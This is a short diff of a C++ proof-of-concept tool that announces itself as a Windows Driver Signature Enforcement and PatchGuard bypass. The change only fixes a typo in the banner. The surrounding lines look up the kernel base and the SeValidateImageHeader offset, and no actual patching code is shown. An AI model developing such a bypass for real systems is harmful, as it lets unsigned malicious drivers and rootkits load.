@@ -6,7 +6,7 @@
 
 int main(int argc, char* argv[])
 {
-	std::cout << "[*] PoC Driver Signature Enforcement (DSE) & PatchGurd Bypass by 4l3x777" << std::endl;	
+	std::cout << "[*] PoC Driver Signature Enforcement (DSE) & PatchGuard Bypass by 4l3x777" << std::endl;	
 	auto base_addr = KernelUtils::ntoskrnl_base();
 
 	auto SeValidateImageHeader_offset = KernelUtils::get_sevalidateimageheader_offset();
